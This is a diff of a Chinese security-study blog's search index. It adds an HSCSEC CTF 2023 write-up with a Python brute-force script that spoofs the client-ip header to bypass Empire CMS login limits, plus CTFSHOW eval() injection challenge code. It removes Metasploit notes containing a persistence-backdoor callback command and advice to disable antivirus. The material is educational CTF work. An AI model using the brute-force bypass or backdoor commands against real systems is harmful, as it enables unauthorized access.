@@ -5078,6 +5078,7 @@
 <h3 id="nohup"><a href="#nohup" class="headerlink" title="nohup"></a>nohup</h3><p>nohup命令可以让进程在后台可靠运行</p>
 <p><a href="https://www.cnblogs.com/emanlee/p/8586261.html">https://www.cnblogs.com/emanlee/p/8586261.html</a></p>
 <h3 id="虚拟机和物理机建立共享文件夹"><a href="#虚拟机和物理机建立共享文件夹" class="headerlink" title="虚拟机和物理机建立共享文件夹"></a>虚拟机和物理机建立共享文件夹</h3><p><a href="https://www.cnblogs.com/heng-xing/p/13382728.html">如何使虚拟机Ubuntu与主机共享文件 - 勤劳小虾米 - 博客园 (cnblogs.com)</a></p>
+<h3 id="python2-安装-pip"><a href="#python2-安装-pip" class="headerlink" title="python2 安装 pip"></a>python2 安装 pip</h3><p><a href="https://blog.csdn.net/weixin_42301220/article/details/115499391">https://blog.csdn.net/weixin_42301220/article/details/115499391</a></p>
 ]]></content>
       <categories>
         <category>Linux</category>
@@ -6367,7 +6368,7 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 <p>虚拟机中的 kali 运行 nps 客户端连接服务器：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">./npc -server=47.115.222.18:8024 -vkey=123456 -<span class="hljs-built_in">type</span>=tcp <br></code></pre></td></tr></table></figure>
 
-<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128212358257.png" alt="image-20230128212358257"></p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230218181355711.png" alt="image-20230218181355711"></p>
 <p>然后访问 <code>http://47.115.222.18:8080/login/index</code> 添加客户端</p>
 <p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128213219769.png" alt="image-20230128213219769"></p>
 <p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128212856202.png" alt="image-20230128212856202"></p>
@@ -7277,8 +7278,19 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
   <entry>
     <title>CTFSHOW 命令执行</title>
     <url>/2022/04/29/CTFSHOW-web%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html</url>
-    <content><![CDATA[<p>CTFSHOW <span id="more"></span></p>
-<p>学习链接：<a href="https://blog.csdn.net/solitudi/article/details/109837640">https://blog.csdn.net/solitudi/article/details/109837640</a></p>
+    <content><![CDATA[<!--toc-->
+
+<p>本篇记录 ctfshow 命令执行解题过程，主要是 PHP 相关的。</p>
+ <span id="more"></span>
+
+
+
+
+
+
+
+
+
 <p>[TOC]</p>
 <h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>
 
@@ -7575,7 +7587,11 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 <p><a href="https://blog.csdn.net/weixin_46081055/article/details/121721209">https://blog.csdn.net/weixin_46081055/article/details/121721209</a></p>
 <p>题目给出System($code)；只能使用大写字母 等</p>
 <p>利用linux的环境变量等来实现命令执行</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/solitudi/article/details/109837640">https://blog.csdn.net/solitudi/article/details/109837640</a></p>
 ]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
       <tags>
         <tag>CTF</tag>
       </tags>
@@ -13506,11 +13522,13 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
       </tags>
   </entry>
   <entry>
-    <title>tryhackme渗透测试-IntroductionToCyberSecurity-03</title>
+    <title>tryhackme 渗透测试-IntroductionToCyberSecurity-03</title>
     <url>/2023/02/06/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-IntroductionToCyberSecurity-03/index.html</url>
     <content><![CDATA[<!--toc-->
+
 <p>开了个会员，冲！</p>
 <span id="more"></span>
+
 <h2 id="网络安全中的职业"><a href="#网络安全中的职业" class="headerlink" title="网络安全中的职业"></a>网络安全中的职业</h2><p>了解网络安全领域的不同职业。</p>
 <h3 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1. 介绍"></a>1. 介绍</h3><p>网络安全职业的需求量越来越大，<a href="https://tryhackme.com/resources/blog/cyber-security-salary-career-options">薪水</a>也越来越高。安全行业有许多不同的工作，从进攻性渗透测试（黑客攻击机器和漏洞报告）到防御性安全（防御和调查网络攻击）。</p>
 <p>为什么要从事网络职业：</p>
@@ -13520,7 +13538,7 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 <li>供不应求——有超过 350 万个网络职位空缺</li>
 </ul>
 <p>这个房间通过提供有关各种网络安全角色的信息来帮助您进入网络安全领域；它还链接到不同的学习路径，您可以使用这些路径开始培养您的网络技能。</p>
-<h3 id="2-安全分析师"><a href="#2-安全分析师" class="headerlink" title="2.  安全分析师"></a>2.  安全分析师</h3><p><img src="/images/tryhackme渗透测试-IntroductionToCyberSecurity-03/5504f125b74401f8633bccd831e4c785.png" alt="img"></p>
+<h3 id="2-安全分析师"><a href="#2-安全分析师" class="headerlink" title="2.  安全分析师"></a>2.  安全分析师</h3><p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-IntroductionToCyberSecurity-03/5504f125b74401f8633bccd831e4c785.png" alt="img"></p>
 <p>安全分析是负责维护组织数据的安全性</p>
 <p>安全分析师是跨组织构建安全措施以保护公司免受攻击不可或缺的一部分。分析师探索和评估公司网络，以发现可操作的数据和建议，供工程师制定预防措施。此工作角色需要与各种利益相关者合作，以了解安全要求和安全形势。</p>
 <h4 id="职责"><a href="#职责" class="headerlink" title="职责"></a>职责</h4><ul>
@@ -13533,7 +13551,7 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 <li><a href="https://tryhackme.com/path/outline/presecurity/">Pre Security</a></li>
 <li><a href="https://tryhackme.com/path/outline/blueteam">Cyber Defense</a></li>
 </ul>
-<h3 id="3-安全工程师"><a href="#3-安全工程师" class="headerlink" title="3. 安全工程师"></a>3. 安全工程师</h3><p><img src="/images/tryhackme渗透测试-IntroductionToCyberSecurity-03/037b40529f9a15660ee458245c8c14dc.png" alt="img"></p>
+<h3 id="3-安全工程师"><a href="#3-安全工程师" class="headerlink" title="3. 安全工程师"></a>3. 安全工程师</h3><p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-IntroductionToCyberSecurity-03/037b40529f9a15660ee458245c8c14dc.png" alt="img"></p>
 <p>安全工程师负责设计、监控和维护安全控制、网络和系统，以帮助防止网络攻击。</p>
 <p>安全工程师使用威胁和漏洞数据开发和实施安全解决方案——通常来自安全团队成员。安全工程师致力于规避各种攻击，包括 Web 应用程序攻击、网络威胁以及不断发展的趋势和策略。最终目标是保留并采用安全措施来减轻攻击和数据丢失的风险。</p>
 <h4 id="职责"><a href="#职责-1" class="headerlink" title="职责"></a>职责</h4><ul>
@@ -13547,7 +13565,7 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 <li><a href="https://tryhackme.com/path/outline/jrpenetrationtester">JR Penetration Tester</a></li>
 <li><a href="https://tryhackme.com/path/outline/pentesting">Offensive Pentesting</a></li>
 </ul>
-<h3 id="4-事件响应者-incident-responder"><a href="#4-事件响应者-Incident-Responder" class="headerlink" title="4. 事件响应者  Incident Responder"></a>4. 事件响应者  Incident Responder</h3><p><img src="/images/tryhackme渗透测试-IntroductionToCyberSecurity-03/6a48b0ea257a587d560ffef4b28f4d35.png" alt="img"></p>
+<h3 id="4-事件响应者-incident-responder"><a href="#4-事件响应者-Incident-Responder" class="headerlink" title="4. 事件响应者  Incident Responder"></a>4. 事件响应者  Incident Responder</h3><p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-IntroductionToCyberSecurity-03/6a48b0ea257a587d560ffef4b28f4d35.png" alt="img"></p>
 <p>事件响应者负责在攻击者的操作仍在展开时识别并减轻攻击。</p>
 <p>事件响应者对安全漏洞做出富有成效和高效的响应。职责包括为组织制定计划、政策和协议，以便在事件发生期间和事件发生后执行。这通常是一个压力很大的位置，随着攻击的展开，需要实时进行评估和响应。事件响应指标包括 MTTD、MTTA 和 MTTR - 检测、确认和恢复（从攻击中）的时间。目的是实现快速有效的响应，保持财务状况并避免负面的违规影响。最终，事件响应者保护公司的数据、声誉和财务状况免受网络攻击。</p>
 <h4 id="职责"><a href="#职责-2" class="headerlink" title="职责"></a>职责</h4><ul>
@@ -13559,7 +13577,7 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 <ul>
 <li><a href="https://tryhackme.com/path/outline/blueteam">Cyber Defense</a></li>
 </ul>
-<h3 id="5-数字取证审查员-digital-forensics-examiner"><a href="#5-数字取证审查员-Digital-Forensics-Examiner" class="headerlink" title="5. 数字取证审查员 Digital Forensics Examiner"></a>5. 数字取证审查员 Digital Forensics Examiner</h3><p><img src="/images/tryhackme渗透测试-IntroductionToCyberSecurity-03/22747e6c2cffce6de0c93f456784be37.png" alt="img"></p>
+<h3 id="5-数字取证审查员-digital-forensics-examiner"><a href="#5-数字取证审查员-Digital-Forensics-Examiner" class="headerlink" title="5. 数字取证审查员 Digital Forensics Examiner"></a>5. 数字取证审查员 Digital Forensics Examiner</h3><p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-IntroductionToCyberSecurity-03/22747e6c2cffce6de0c93f456784be37.png" alt="img"></p>
 <p>数字取证审查员负责使用数字取证调查事件和犯罪</p>
 <p>如果你喜欢扮演侦探，这可能是完美的工作。如果您是执法部门的一员，您将专注于收集和分析证据以帮助破案：指控有罪者和无辜者无罪。另一方面，如果您的工作属于保护公司网络的范畴，您将使用您的取证技能来分析事件，例如违反政策的行为。</p>
 <h4 id="职责"><a href="#职责-3" class="headerlink" title="职责"></a>职责</h4><ul>
@@ -13567,7 +13585,7 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 <li>分析数字证据以找到与案件相关的答案</li>
 <li>记录您的发现并报告案例</li>
 </ul>
-<h3 id="6-恶意软件分析师-malware-analyst"><a href="#6-恶意软件分析师-Malware-Analyst" class="headerlink" title="6.  恶意软件分析师 Malware Analyst"></a>6.  恶意软件分析师 Malware Analyst</h3><p><img src="/images/tryhackme渗透测试-IntroductionToCyberSecurity-03/49b9585d464f633da235ad1ac6e657d8.png" alt="img"></p>
+<h3 id="6-恶意软件分析师-malware-analyst"><a href="#6-恶意软件分析师-Malware-Analyst" class="headerlink" title="6.  恶意软件分析师 Malware Analyst"></a>6.  恶意软件分析师 Malware Analyst</h3><p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-IntroductionToCyberSecurity-03/49b9585d464f633da235ad1ac6e657d8.png" alt="img"></p>
 <p>恶意软件分析师负责分析所有类型的恶意软件以更多地了解它们的工作原理和作用</p>
 <p>恶意软件分析师的工作包括分析可疑程序、发现它们的行为并编写有关其发现的报告。恶意软件分析师有时被称为逆向工程师，因为他们的核心任务围绕着将编译的程序从机器语言转换为可读代码，通常是低级语言。这项工作要求恶意软件分析师具有很强的编程背景，尤其是汇编语言和 C 语言等低级语言。最终目标是了解恶意程序执行的所有活动，了解如何检测和报告它。</p>
 <h4 id="职责"><a href="#职责-4" class="headerlink" title="职责"></a>职责</h4><ul>
@@ -13575,7 +13593,7 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 <li>通过观察受控环境中的活动对恶意软件样本进行动态分析</li>
 <li>记录并报告所有发现</li>
 </ul>
-<h3 id="7-渗透测试员-penetration-tester"><a href="#7-渗透测试员-Penetration-Tester" class="headerlink" title="7.  渗透测试员 Penetration Tester"></a>7.  渗透测试员 Penetration Tester</h3><p><img src="/images/tryhackme渗透测试-IntroductionToCyberSecurity-03/1b9ac0842dca3efabbc15387fc4f0261.png" alt="img"></p>
+<h3 id="7-渗透测试员-penetration-tester"><a href="#7-渗透测试员-Penetration-Tester" class="headerlink" title="7.  渗透测试员 Penetration Tester"></a>7.  渗透测试员 Penetration Tester</h3><p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-IntroductionToCyberSecurity-03/1b9ac0842dca3efabbc15387fc4f0261.png" alt="img"></p>
 <p>渗透测试员负责测试技术产品的安全漏洞</p>
 <p>您可能会看到渗透测试被称为渗透测试和道德黑客攻击。渗透测试人员的工作职责是测试公司内部系统和软件的安全性——这是通过尝试通过系统化的黑客攻击来发现缺陷和漏洞来实现的。渗透测试人员利用这些漏洞来评估每个实例的风险。然后，公司可以利用这些见解来纠正问题，以防止现实世界中的网络攻击。</p>
 <h4 id="职责"><a href="#职责-5" class="headerlink" title="职责"></a>职责</h4><ul>
@@ -13588,7 +13606,7 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 <li><a href="https://tryhackme.com/path/outline/jrpenetrationtester">JR Penetration Tester</a></li>
 <li><a href="https://tryhackme.com/path/outline/pentesting">Offensive Pentesting</a></li>
 </ul>
-<h3 id="8-红队人员-red-teamer"><a href="#8-红队人员-Red-Teamer" class="headerlink" title="8. 红队人员 Red Teamer"></a>8. 红队人员 Red Teamer</h3><p><img src="/images/tryhackme渗透测试-IntroductionToCyberSecurity-03/4fa8afd51656c084df33a42566709610.png" alt="img"></p>
+<h3 id="8-红队人员-red-teamer"><a href="#8-红队人员-Red-Teamer" class="headerlink" title="8. 红队人员 Red Teamer"></a>8. 红队人员 Red Teamer</h3><p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-IntroductionToCyberSecurity-03/4fa8afd51656c084df33a42566709610.png" alt="img"></p>
 <p>红队人员负责扮演对手的角色，攻击组织并从敌人的角度提供反馈</p>
 <p>红队与渗透测试员有相似之处，具有更有针对性的工作角色。渗透测试人员希望发现系统中的许多漏洞，以保持网络防御的良好状态，而红队则负责测试公司的检测和响应能力。该工作角色需要模仿网络罪犯的行为、模拟恶意攻击、保留访问权限并避免被发现。红队评估最多可以运行一个月，通常由公司外部的团队进行。它们通常最适合拥有成熟安全程序的组织。</p>
 <h4 id="职责"><a href="#职责-6" class="headerlink" title="职责"></a>职责</h4><ul>
@@ -13808,7 +13826,7 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
       </tags>
   </entry>
   <entry>
-    <title>tryhackme渗透测试之NmapLiveHostDiscovery</title>
+    <title>tryhackme 渗透测试之 NmapLiveHostDiscovery</title>
     <url>/2023/02/07/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BNmapLiveHostDiscovery/index.html</url>
     <content><![CDATA[<!--toc-->
 
@@ -13956,28 +13974,174 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
       </tags>
   </entry>
   <entry>
-    <title></title>
-    <url>/2023/02/17/metasploit%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/index.html</url>
-    <content><![CDATA[<h6 id="tags-渗透测试"><a href="#tags-渗透测试" class="headerlink" title="tags: 渗透测试"></a>tags: <code>渗透测试</code></h6><p>[TOC]</p>
-<h1 id="metasploit-学习记录"><a href="#metasploit-学习记录" class="headerlink" title="metasploit 学习记录"></a>metasploit 学习记录</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><p><a href="https://www.jianshu.com/p/d9059440df68">https://www.jianshu.com/p/d9059440df68</a></p>
-<h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><blockquote>
-<p><a href="https://www.anquanke.com/post/id/227286">https://www.anquanke.com/post/id/227286</a></p>
+    <title>HSCSEC_CTF_2023</title>
+    <url>/2023/02/17/HSCSEC-CTF-2023/index.html</url>
+    <content><![CDATA[<!--toc-->
+
+<p>闲来无事做的，可以说提升不是很大，看了一眼web题都<strong>没给源码</strong>其实就能猜到题目绝对不算很难。</p>
+<span id="more"></span>
+
+<h2 id="web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easyphy"><a href="#EASYPHY" class="headerlink" title="EASYPHY"></a>EASYPHY</h3><p>被这个题目恶心了好久，咋都绕不过，最关键的是好像放文件的那个目录默认会把所有文件都当作图片解析。后面发现是在入口点有个文件包含，这告诉我们做 CTF 题目真的每一个页面跳转点都要抓包看一下。</p>
+<p>点击 upload 就可以看到下面的包了，这里有个文件包含。页面源码告诉我们 flag.php，结合上传的文件内容不能有 eval 等可以知道直接打印（highlight_file 函数）出 flag.php 文件的内容即可。</p>
+<p><img src="/images/HSCSEC-CTF-2023/image-20230217211525547.png" alt="image-20230217211525547"></p>
+<p><img src="/images/HSCSEC-CTF-2023/image-20230217211631649.png" alt="image-20230217211631649"></p>
+<h3 id="ezcms"><a href="#EZCMS" class="headerlink" title="EZCMS"></a>EZCMS</h3><blockquote>
+<p>懒得写了，看别人 wp吧，我只想说题目出的不好玩啊。。。</p>
 </blockquote>
-<h2 id="后渗透攻击后门"><a href="#后渗透攻击：后门" class="headerlink" title="后渗透攻击：后门"></a>后渗透攻击：后门</h2><h3 id="操作系统后门"><a href="#操作系统后门" class="headerlink" title="操作系统后门"></a>操作系统后门</h3><h4 id="操作系统后门之-persistence-后门"><a href="#操作系统后门之-Persistence-后门" class="headerlink" title="操作系统后门之 Persistence 后门"></a>操作系统后门之 Persistence 后门</h4><p>Persistence 是一款使用安装自启动方式的持久性后门程序，读者可以利用它创建和注册文件。<br>可以在 meterpreter 下 输入 <code>run persistence -h</code> 查看用到的所有命令选项<br>输入以下命令可以创建一个持久性的后门：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">run persistence -A -S -U -i 60 -p 4321 -r 192.168.172.138<br></code></pre></td></tr></table></figure>
-<ul>
-<li>A:自动启动 Payload 程序</li>
-<li>S：系统启动时自动加载</li>
-<li>U：用户登录时自动启动</li>
-<li>X：开机时自动加载</li>
-<li>i：回连的时间间隔</li>
-<li>P：监听反向连接端口号</li>
-<li>r：目标机器ip地址</li>
-</ul>
-<p>知识点：这个脚本需要在目标机器上创建文件从而可能会触发杀毒软件，建议运行前关闭杀毒软件。</p>
-<h3 id="web-后门"><a href="#Web-后门" class="headerlink" title="Web 后门"></a>Web 后门</h3><p><img src="https://i.imgur.com/o7dQXCK.png"></p>
-<h4 id="php-meterpreter-后门"><a href="#PHP-Meterpreter-后门" class="headerlink" title="PHP Meterpreter 后门"></a>PHP Meterpreter 后门</h4><p><img src="https://i.imgur.com/glnhHLf.jpg"></p>
-<h4 id="aspx-meterpreter-后门"><a href="#Aspx-Meterpreter-后门" class="headerlink" title="Aspx Meterpreter 后门"></a>Aspx Meterpreter 后门</h4><p><img src="https://i.imgur.com/IVmhbsn.jpg"></p>
+<p>还是自己回来看了下，毕竟练一下 php 代码审计，虽然我对帝国 cms 不是很熟悉….</p>
+<p>我是已经知道要爆破账户密码登录的前提下来进行一个定向的审计，主要是针对如何绕过登录次数限制的那一部分代码，所以其他代码并没有看。（其实在审计的时候发现账户密码都是做了参数过滤的，可恶的出题人）</p>
+<p>显然的 e&#x2F;admin&#x2F;index.php 是后台登录的主页，可以从这里开始登录点的代码审计。</p>
+<p>在这里输入账户、密码抓包可以发现是在 &#x2F;e&#x2F;admin&#x2F;ecmsadmin.php 处理登录逻辑</p>
+<p><img src="/images/HSCSEC-CTF-2023/image-20230219155407723.png" alt="image-20230219155407723"></p>
+<p>该 php 文件源码如下：</p>
+<p><img src="/images/HSCSEC-CTF-2023/image-20230219155733501.png" alt="image-20230219155733501"></p>
+<p>可以发现在 34 行转到 login() 函数，跟进（代码较长，仅节选）：</p>
+<p><img src="/images/HSCSEC-CTF-2023/image-20230219160629998.png" alt="image-20230219160629998"></p>
+<p>可以看到第 78 行以 loginip、logintime 为参数调用了 <code>CheckLoginNum()</code> 函数来验证登录次数，相关源码如下：</p>
+<p>**egetip()**：</p>
+<p><img src="/images/HSCSEC-CTF-2023/image-20230219161639750.png" alt="image-20230219161639750"></p>
+<p>审计一下发现服务端获取 ip 的过程很简单，就是从客户端的 HTTP 首部中提提取 HTTP_CLIENT_IP、HTTP_X_FORWARDED_FOR 等变量的值，只要这些变量中有一个不为 unknown，那就把相应变量赋值给 ip。<strong>这里肯定是我们可控的！</strong></p>
+<p>然后还有一个 if 判断 getiptype 是否大于 0，在 config.php 可以看到这个变量默认是0，所以不会进行 if 判断！最后又对 ip 参数作了一个过滤，这个 cms 这么懂安全的吗？</p>
+<p>time() 函数返回自 Unix 纪元（January 1 1970 00:00:00 GMT）起的当前时间的秒数。这个是PHP内置的函数，没什么好说的。</p>
+<p><img src="/images/HSCSEC-CTF-2023/image-20230219162951457.png" alt="image-20230219162951457"></p>
+<p>回到 <code>CheckLoginNum()</code>：</p>
+<p><img src="/images/HSCSEC-CTF-2023/image-20230219160738408.png" alt="image-20230219160738408"></p>
+<p>审计发现调用 getcvar() 函数返回相关变量的 Cookie，该函数源码如下：</p>
+<p><img src="/images/HSCSEC-CTF-2023/image-20230219163553039.png" alt="image-20230219163553039"></p>
+<p>会在我们传入的变量前面拼接上一个字符串，同样地在 config.php 里面找到这个字符串的定义：</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$ecms_config</span>[<span class="hljs-string">&#x27;cks&#x27;</span>][<span class="hljs-string">&#x27;ckvarpre&#x27;</span>]=<span class="hljs-string">&#x27;gdssj&#x27;</span>;		<span class="hljs-regexp">//</span>前台cookie变量前缀<br></code></pre></td></tr></table></figure>
+
+<p>最后是在 _COOKIE 全局数组中查找拼接后的字符串对应的值并返回。</p>
+<p>那我们这里初始爆破账户密码登录的时候肯定在 _COOKIE 全局数组中是没有这些值的，所以跳过 40 行的 if 语句直接往下看即可。</p>
+<p>现在是来到关键的 数据库验证处：</p>
+<p><img src="/images/HSCSEC-CTF-2023/image-20230219165416191.png" alt="image-20230219165416191"></p>
+<figure class="highlight n1ql"><table><tr><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*) <span class="hljs-keyword">as</span> total <span class="hljs-keyword">from</span> &#123;$dbtbpre&#125;enewsloginfail <span class="hljs-keyword">where</span> ip=<span class="hljs-string">&#x27;$ip&#x27;</span> <span class="hljs-keyword">and</span> num&gt;=$public_r[loginnum] <span class="hljs-keyword">and</span> lasttime&gt;$chtime <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>如果以上 sql 语句没有查到结果，那么就可以通过这个验证登录次数函数。可以看到 where 条件语句中的 ip 就是我们之前 <strong>egetip()</strong> 函数返回的结果，所以这个 ip 是我们可控的，只要让 ip 是一个数据库中不存在的变量，那么自然就无法查询到结果。</p>
+<h4 id="exp"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><blockquote>
+<p>请更换自己的 origin、referer，ip可以随便为一个数字</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>burp0_url = <span class="hljs-string">&quot;http://290c9496-19c8-4d74-b02b-f7ba7010e8ce.race-node.hscsec.cn:8080/e/admin/ecmsadmin.php&quot;</span><br>proxies=&#123;<span class="hljs-string">&#x27;http&#x27;</span>:<span class="hljs-string">&#x27;http://127.0.0.1:8080&#x27;</span>,<span class="hljs-string">&#x27;https&#x27;</span>:<span class="hljs-string">&#x27;https://127.0.0.1:8080&#x27;</span>&#125;<br><br>ip = <span class="hljs-number">9999</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;后台密码.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.readlines():<br>        username = i.strip()<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;后台密码.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f1:<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> f1.readlines():<br>                password = j.strip()<br>                headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://290c9496-19c8-4d74-b02b-f7ba7010e8ce.race-node.hscsec.cn:8080&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://290c9496-19c8-4d74-b02b-f7ba7010e8ce.race-node.hscsec.cn:8080/e/admin/&quot;</span>, <span class="hljs-string">&quot;client-ip&quot;</span>: <span class="hljs-built_in">str</span>(ip), <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>                data = &#123;<span class="hljs-string">&quot;enews&quot;</span>: <span class="hljs-string">&quot;login&quot;</span>, <span class="hljs-string">&quot;eposttime&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-string">&quot;username&quot;</span>: username, <span class="hljs-string">&quot;password&quot;</span>: password,<br>                              <span class="hljs-string">&quot;equestion&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-string">&quot;eanswer&quot;</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&quot;adminwindow&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-string">&quot;imageField.x&quot;</span>: <span class="hljs-string">&quot;22&quot;</span>,<br>                              <span class="hljs-string">&quot;imageField.y&quot;</span>: <span class="hljs-string">&quot;12&quot;</span>, <span class="hljs-string">&quot;empirecmskey1&quot;</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&quot;empirecmskey2&quot;</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&quot;empirecmskey3&quot;</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>                              <span class="hljs-string">&quot;empirecmskey4&quot;</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&quot;empirecmskey5&quot;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;<br>                res = requests.post(burp0_url,proxies=proxies, headers=headers, data=data)<br>                <span class="hljs-comment">#print(res.text)</span><br>                <span class="hljs-comment"># exit()</span><br>                ip += <span class="hljs-number">1</span><br>                p_result=<span class="hljs-string">&quot;&lt;b&gt;(.*?)&lt;/b&gt;&quot;</span><br>                result=re.findall(p_result,res.text)<br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;答案有误&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.text:<br>                        <span class="hljs-built_in">print</span>(username,password)<br>                        <span class="hljs-built_in">print</span>(result[<span class="hljs-number">0</span>])<br>                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                    <span class="hljs-keyword">pass</span><br><br></code></pre></td></tr></table></figure>
+
+<p>可以得到账号 admin1122 密码 adminadmin123</p>
+<p>登录到后台就可以用网上现成的几个洞了，</p>
+<p>参考 <a href="https://blog.csdn.net/m0_55793759/article/details/126711655">帝国Cms7.5后台getshell | (CVE-2018-18086)漏洞复现</a></p>
+<p>但是导入系统模型这里的时候，你会发现，就算你导入1.mod这样的mod文件也无法导入，</p>
+<p><img src="https://emoment.top/img/2023HSCSEC-CTF/image-20230213213418644.png" alt="image-20230213213418644"></p>
+<p>.php.mod也不行</p>
+<p>继续看源码</p>
+<p>&#x2F;e&#x2F;class&#x2F;moddofun.php</p>
